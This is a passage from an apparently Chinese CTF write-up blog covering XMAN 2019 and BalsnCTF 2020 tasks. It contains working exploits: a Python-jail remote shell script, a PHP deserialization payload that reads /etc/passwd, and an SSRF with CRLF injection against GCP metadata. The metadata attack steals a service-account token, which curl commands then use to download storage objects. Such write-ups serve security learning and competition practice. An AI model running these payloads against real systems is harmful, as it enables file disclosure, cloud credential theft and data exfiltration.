class="number">1</span>]</span><br><span class="line">conn=remote(<span class="string">&#x27;47.97.253.115&#x27;</span>,<span class="number">10005</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;table=list(s)&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;sys=&#x27;</span>+get_str(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">conn.sendline(<span class="string">&#x27;fun=getattr(os,sys)&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        command=<span class="built_in">input</span>(<span class="string">&#x27;(www):$&#x27;</span>)</span><br><span class="line">        new_com=<span class="string">&#x27;fun(&#x27;</span>+get_str(command)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        conn.sendline(new_com)</span><br><span class="line">        <span class="built_in">print</span>(conn.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>))</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p>
+<h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p>
+<p>所有的数据都是32个字符</p>
+<p>所以猜测是md5加密</p>
+<p>找出符合md5格式的数据</p>
+<p>68dffd5a1be838b5326209714f7ea7a5</p>
+<p>解密后提交flag{n3k0}失败</p>
+<p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p>
+<p>成功</p>
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$b</span> = strpos(<span class="keyword">$this</span>-&gt;a, <span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$b</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_URL, <span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> curl_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;z&quot;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;z&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>curl_exec+反序列化</p>
+<p>试了下本地文件读取</p>
+<p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p>
+<p>题目过滤flag字符</p>
+<p>说明我们flag就在flag文件里</p>
+<p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p>
+<p>最后的payload:</p>
+<p><a target="_blank" rel="noopener" href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:%7Bs:1:%22a%22;s:23:%22file://localhost/%2566lag%22;%7D">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p>
+<p>这里有一些坑就是:</p>
+<ol>
+<li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p>
+</li>
+<li><p>因为是二次编码所以要注意字符串的长度</p>
+</li>
+</ol>
+<h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p>
+<p>发现onion.jpg文件尾后还有数据</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p>
+<p>zip格式,get一个新的加密压缩包</p>
+<p>密码在hint里有提示</p>
+<p>接下来就是很普通的写python了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">filename,hint</span>):</span></span><br><span class="line">    password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        password=hint.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">chr</span>(i))</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(filename) <span class="keyword">as</span> myzip:</span><br><span class="line">            <span class="keyword">try</span> :</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;解密:&quot;</span>+filename+<span class="string">&quot;:&quot;</span>+password)</span><br><span class="line">                myzip.read(<span class="string">&#x27;onion.zip&#x27;</span>,pwd=<span class="built_in">bytes</span>(password,encoding=<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">return</span> password</span><br><span class="line">            <span class="keyword">except</span> RuntimeError: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;解密失败&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                <span class="built_in">input</span>(<span class="string">&#x27;过来康康&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> zipfile.zlib.error:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;跳过&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">127</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;爆破失败&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;爆破成功&#x27;</span>+password)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writebyte</span>(<span class="params">bbyte,filename</span>):</span></span><br><span class="line">    f=<span class="built_in">open</span>(filename,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(bbyte)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readbyte</span>(<span class="params">filename</span>):</span></span><br><span class="line">    f=<span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    bbyte=f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> bbyte</span><br><span class="line"></span><br><span class="line">nullbyte=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;temp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    hint=f.read()[<span class="number">12</span>:]</span><br><span class="line">    f.close()</span><br><span class="line">    pwd=burp(<span class="string">&#x27;onion1.zip&#x27;</span>,hint)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;onion1.zip&#x27;</span>) <span class="keyword">as</span> myzip:</span><br><span class="line">        <span class="built_in">str</span>=myzip.read(<span class="string">&#x27;onion.zip&#x27;</span>,pwd=<span class="built_in">bytes</span>(pwd,encoding=<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        writebyte(<span class="built_in">str</span>,<span class="string">&quot;temp.zip&quot;</span>)</span><br><span class="line">        <span class="built_in">str</span>=myzip.read(<span class="string">&#x27;hint.txt&#x27;</span>,pwd=<span class="built_in">bytes</span>(pwd,encoding=<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        writebyte(<span class="built_in">str</span>,<span class="string">&quot;temp.txt&quot;</span>)</span><br><span class="line">    writebyte(readbyte(<span class="string">&#x27;temp.zip&#x27;</span>),<span class="string">&#x27;onion1.zip&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data,groupnums</span>):</span></span><br><span class="line">    a=[]</span><br><span class="line">    b=[]</span><br><span class="line">    section=<span class="built_in">int</span>(<span class="built_in">len</span>(data)/groupnums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),section):</span><br><span class="line">        a.append(data[i:i+section])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(section):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(groupnums):</span><br><span class="line">            b.append(a[j][i])</span><br><span class="line">    cipher=(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i])^i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b))))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    result=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(data)+<span class="number">1</span>):</span><br><span class="line">        result.append(encrypt(data,i))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">may_r=decrypt(<span class="string">&#x27;f^n2ekass:iy~&gt;w|`ef&quot;$&#123;Ip)8if&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> may_r:</span><br><span class="line">    <span class="built_in">print</span>(i[::<span class="number">2</span>]+i[<span class="number">1</span>::<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cku89gxsl0000wvosd9debc19" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2020 balsn ctf web 部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2021-10-01T11:06:19.623Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/10/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2020-BalsnCTF-web-部分题解"><a href="#2020-BalsnCTF-web-部分题解" class="headerlink" title="2020 BalsnCTF web 部分题解"></a>2020 BalsnCTF web 部分题解</h1><p>文章首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222675">安全客</a></p>
+<p>题目文件：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ">https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ</a><br>提取码：v7qg </p>
+<h2 id="tpc"><a href="#tpc" class="headerlink" title="tpc"></a>tpc</h2><p><a target="_blank" rel="noopener" href="http://35.194.175.80:8000/">http://35.194.175.80:8000/</a></p>
+<p>题目说flag就在工作目录下并且不可以暴力猜解出文件名</p>
+<p>试着file协议，发现可以任意文件读取，那么我们首先要做的是试着读取源文件</p>
+<p>读取/proc/self/cmdline查看启动命令</p>
+<p><code>/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -</code></p>
+<p>谷歌以下gunicorn的用法很容易知道源文件就是<code>main-dc1e2f5f7a4f359bb5ce1317a.py</code></p>
+<p>再读取/proc/self/environ查看环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=tpc-1PYTHON_PIP_VERSION=19.0.3SHLVL=1HOME=/home/ggGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.2PWD=/opt/workdir</span><br></pre></td></tr></table></figure>
+
+<p>于是就知道源文件在 /opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/query&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    site = request.args.get(<span class="string">&#x27;site&#x27;</span>)</span><br><span class="line">    text = urllib.request.urlopen(site).read()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/query?site=[your website]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>就提供了一个很简单的ssrf功能，那么为了找到下一步的思路，就必须收集更多信息，用字典fuzz一下得到以下关键信息</p>
+<p>/proc/1/net/arp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.4       0x1         0x0         00:00:00:00:00:00     *        docker0</span><br><span class="line">172.17.0.3       0x1         0x0         00:00:00:00:00:00     *        docker0</span><br><span class="line">172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        docker0</span><br><span class="line">10.140.0.1       0x1         0x2         42:01:0a:8c:00:01     *        eth0</span><br></pre></td></tr></table></figure>
+
+<p>/etc/hosts</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># /etc/hosts: Local Host Database</span><br><span class="line">#</span><br><span class="line"># This file describes a number of aliases-to-address mappings for the for </span><br><span class="line"># local hosts that share this file.</span><br><span class="line">#</span><br><span class="line"># In the presence of the domain name service or NIS, this file may not be </span><br><span class="line"># consulted at all; see /etc/host.conf for the resolution order.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># IPv4 and IPv6 localhost aliases</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Imaginary network.</span><br><span class="line">#10.0.0.2               myname</span><br><span class="line">#10.0.0.3               myfriend</span><br><span class="line">#</span><br><span class="line"># According to RFC 1918, you can use the following IP networks for private </span><br><span class="line"># nets which will never be connected to the Internet:</span><br><span class="line">#</span><br><span class="line">#       10.0.0.0        -   10.255.255.255</span><br><span class="line">#       172.16.0.0      -   172.31.255.255</span><br><span class="line">#       192.168.0.0     -   192.168.255.255</span><br><span class="line">#</span><br><span class="line"># In case you want to be able to connect directly to the Internet (i.e. not </span><br><span class="line"># behind a NAT, ADSL router, etc...), you need real official assigned </span><br><span class="line"># numbers.  Do not try to invent your own network numbers but instead get one </span><br><span class="line"># from your network provider (if any) or from your regional registry (ARIN, </span><br><span class="line"># APNIC, LACNIC, RIPE NCC, or AfriNIC.)</span><br><span class="line">#</span><br><span class="line">169.254.169.254 metadata.google.internal metadata</span><br></pre></td></tr></table></figure>
+
+
+
+<p>hosts文件里面添加了一条特殊的记录，谷歌一下发现里面存放着实例的一些数据</p>
+<p>直接访问<code>metadata.google.internal</code>，得到：</p>
+<p><code>0.1/ computeMetadata/</code></p>
+<p>继续访问下一级目录发现500了</p>
+<p>阅读<a target="_blank" rel="noopener" href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying">文档</a>得知要加入<code>Metadata-Flavor: Google</code>请求头</p>
+<p>python的urlllib库之前爆出存在着CRLF的漏洞，利用这个来绕过</p>
+<p><code>&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal/PATH/%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</code></p>
+<p>写个脚本读取所有数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">parent,path</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal&quot;</span>+parent+path+<span class="string">&quot;%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(burp0_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">parent,path</span>):</span></span><br><span class="line">    r = req(parent,path)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(parent+path)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----------------------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    child = r.text.splitlines()</span><br><span class="line">    parent=parent+path</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> child:</span><br><span class="line">        </span><br><span class="line">        getInfo(parent,i)</span><br><span class="line"></span><br><span class="line">getInfo(parent=<span class="string">&quot;&quot;</span>,path=<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到以下数据（只显示对题目有用的数据）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/project/project-id</span><br><span class="line">balsn-ctf-2020-tpc</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/instance/service-accounts/default/token</span><br><span class="line">&#123;&quot;access_token&quot;:&quot;ya29.c.KpcB5QdRi_ofZUDT6YcnsZrXwex0ocEfddkf1cL9qgsBVUuJI6xm7X__zkSxCc4jbw35HGJ2ZSbVUQljIKqOWbe_-q33It_9ip0sO15lH8usKPuj1I-vg2BHQeyizyWloiDf2vlRbL0EiZNaiKa3_tGFFEbxt9JrmsfYxWoN3_VOn3cqTbjNyEdj3-Xr3oQUiD0ESz0H2NS4Lg&quot;,&quot;expires_in&quot;:3147,&quot;token_type&quot;:&quot;Bearer&quot;&#125;</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/instance/service-accounts/default/scopes</span><br><span class="line">https://www.googleapis.com/auth/devstorage.read_only</span><br><span class="line">https://www.googleapis.com/auth/logging.write</span><br><span class="line">https://www.googleapis.com/auth/monitoring.write</span><br><span class="line">https://www.googleapis.com/auth/servicecontrol</span><br><span class="line">https://www.googleapis.com/auth/service.management.readonly</span><br><span class="line">https://www.googleapis.com/auth/trace.append</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>阅读<a target="_blank" rel="noopener" href="https://cloud.google.com/storage/docs">文档</a>来了解下载存储在服务器上的数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查询存储分区：</span></span><br><span class="line">curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc&quot;</span><br><span class="line"><span class="meta">  </span></span><br><span class="line"><span class="meta">#</span><span class="bash">查询存储对象</span></span><br><span class="line">curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载对象：</span></span><br><span class="line">curl -X GET -o &quot;/tmp/obj1&quot; -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&amp;alt=media&quot;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>将所有对象下载下来后<code>cat * | grep -a flag</code><br>获得flag路径：<code>/opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt</code></p>
+<p>BALSN{What_permissions_does_the_service_account_need}</p>
+<h2 id="L5D"><a href="#L5D" class="headerlink" title="L5D"></a>L5D</h2><p>题目描述</p>
+<blockquote>
